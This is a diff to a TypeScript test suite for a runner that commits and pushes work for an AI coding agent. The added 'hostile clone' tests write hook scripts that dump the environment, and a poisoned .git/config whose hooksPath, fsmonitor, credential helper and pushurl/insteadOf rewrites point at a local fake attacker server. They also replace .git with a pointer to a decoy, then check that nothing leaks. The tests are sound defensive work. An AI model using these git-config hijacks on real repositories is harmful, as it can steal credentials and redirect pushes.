@@ -1,5 +1,7 @@
 import { existsSync } from 'node:fs';
-import { mkdir, mkdtemp, readdir, readFile, rm, symlink, writeFile } from 'node:fs/promises';
+import { chmod, mkdir, mkdtemp, readdir, readFile, rm, symlink, writeFile } from 'node:fs/promises';
+import { createServer, type Server } from 'node:http';
+import type { AddressInfo } from 'node:net';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import type { AssignedRepository, TurnAssignment } from '@coredoc/core/agent-runner';
@@ -138,7 +140,14 @@ describe('implement turns in the runner loop', () => {
       .trim()
       .split('\n')
       .map(
-        (line) => JSON.parse(line) as { args: string[]; GIT_DIR: string; GIT_WORK_TREE: string; auth: string | null },
+        (line) =>
+          JSON.parse(line) as {
+            args: string[];
+            GIT_DIR: string;
+            GIT_WORK_TREE: string;
+            auth: string | null;
+            authKey: string | null;
+          },
       );
     expect(scans.map((scan) => scan.args[2])).toEqual(['commit', 'push']);
     expect(scans[1]!.args).toEqual(
@@ -149,6 +158,8 @@ describe('implement turns in the runner loop', () => {
     ).toBe(true);
     expect(scans[0]!.auth).toBeNull();
     expect(scans[1]!.auth).toContain('Authorization: Basic ');
+    // Scoped to the assigned clone URL, never a global http setting.
+    expect(scans[1]!.authKey).toBe(`http.file://${bare}.extraHeader`);
 
     // The bot's permissions were read with its token before the session started.
     expect(github.requests[0]).toMatchObject({
@@ -353,6 +364,105 @@ describe('implement turns in the runner loop', () => {
       expect(outcome).toMatchObject({ kind: 'failed', code: 'secret_scan_blocked' });
       expect(JSON.stringify(outcome)).toContain('billing-api: keys.ts');
       expect(JSON.stringify(api.completions[0])).not.toContain(SECRET_MARKER);
+    });
+  });
+
+  describe('a hostile clone', () => {
+    let attacker: Server;
+    let attackerUrl: string;
+    const attackerRequests: Array<{ url?: string; authorization?: string }> = [];
+
+    beforeEach(async () => {
+      attackerRequests.length = 0;
+      attacker = createServer((req, res) => {
+        attackerRequests.push({ url: req.url, authorization: req.headers.authorization });
+        res.writeHead(404);
+        res.end();
+      });
+      await new Promise<void>((resolve) => attacker.listen(0, '127.0.0.1', resolve));
+      attackerUrl = `http://127.0.0.1:${(attacker.address() as AddressInfo).port}`;
+    });
+
+    afterEach(async () => {
+      await new Promise<void>((resolve) => attacker.close(() => resolve()));
+    });
+
+    async function hook(path: string, marker: string) {
+      await mkdir(join(path, '..'), { recursive: true });
+      await writeFile(path, `#!/bin/sh\necho "$0" >> ${marker}\nenv >> ${marker}\n`);
+      await chmod(path, 0o755);
+    }
+
+    it('cannot redirect the push, run hooks or send the bot’s header anywhere else', async () => {
+      const { bare, repo } = await orders();
+      const decoy = await bareRemote(root, 'decoy');
+      const marker = join(root, 'hook-ran');
+      const evilHooks = join(root, 'evil-hooks');
+      const { done } = runTurn(implementAssignment([repo]), [
+        {
+          act: async (cwd) => {
+            const clone = join(cwd, 'orders-api');
+            for (const name of ['pre-commit', 'commit-msg', 'post-commit', 'pre-push', 'reference-transaction']) {
+              await hook(join(clone, '.git', 'hooks', name), marker);
+              await hook(join(evilHooks, name), marker);
+            }
+            await hook(join(evilHooks, 'fsmonitor'), marker);
+            await hook(join(evilHooks, 'helper'), marker);
+            await writeFile(
+              join(root, 'evil.config'),
+              `[url "${attackerUrl}/included.git"]\n\tpushInsteadOf = file://${bare}\n[http]\n\textraHeader = X-Evil: 1\n`,
+            );
+            await writeFile(
+              join(clone, '.git', 'config'),
+              [
+                '[core]',
+                '\trepositoryformatversion = 0',
+                '\tbare = false',
+                `\thooksPath = ${evilHooks}`,
+                `\tfsmonitor = ${join(evilHooks, 'fsmonitor')}`,
+                '[credential]',
+                `\thelper = !${join(evilHooks, 'helper')}`,
+                '[remote "origin"]',
+                `\turl = file://${decoy}`,
+                `\tpushurl = ${attackerUrl}/push.git`,
+                `[url "${attackerUrl}/rewritten.git"]`,
+                `\tinsteadOf = file://${bare}`,
+                '[include]',
+                `\tpath = ${join(root, 'evil.config')}`,
+                '',
+              ].join('\n'),
+            );
+            await writeFile(join(clone, 'src', 'orders.ts'), 'export const orders = [7];\n');
+          },
+          submit: RESULT,
+        },
+      ]);
+      await expect(done).resolves.toBe('completed');
+
+      expect(api.completions[0]!.body.outcome).toEqual({ kind: 'ended' });
+      expect(git(bare, 'show', `${BRANCH}:src/orders.ts`)).toBe('export const orders = [7];');
+      expect(remoteHead(decoy, BRANCH)).toBeNull();
+      expect(attackerRequests).toEqual([]);
+      expect(existsSync(marker)).toBe(false);
+    });
+
+    it('a git directory replaced by a pointer elsewhere fails the turn and pushes nothing', async () => {
+      const { bare, repo } = await orders();
+      const decoy = await bareRemote(root, 'decoy');
+      const { done } = runTurn(implementAssignment([repo]), [
+        {
+          act: async (cwd) => {
+            const clone = join(cwd, 'orders-api');
+            await rm(join(clone, '.git'), { recursive: true, force: true });
+            await writeFile(join(clone, '.git'), `gitdir: ${decoy}\n`);
+          },
+          submit: RESULT,
+        },
+      ]);
+      await expect(done).resolves.toBe('completed');
+      expect(api.completions[0]!.body.outcome).toMatchObject({ kind: 'failed', code: 'agent_error' });
+      expect(remoteHead(bare, BRANCH)).toBeNull();
+      expect(remoteHead(decoy, BRANCH)).toBeNull();
     });
   });
 
